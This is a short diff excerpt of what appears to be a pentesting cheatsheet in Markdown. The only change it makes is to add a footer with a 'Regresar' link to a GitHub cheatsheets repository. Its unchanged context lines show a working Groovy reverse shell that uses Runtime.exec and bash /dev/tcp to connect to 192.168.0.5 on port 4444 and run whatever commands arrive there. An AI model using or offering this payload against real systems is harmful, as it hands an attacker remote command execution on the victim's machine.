@@ -47,3 +47,8 @@ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5< >/dev/tcp/192.168.0.5/4444;cat <& 5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
+
+---
+:::info
+[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)
+:::
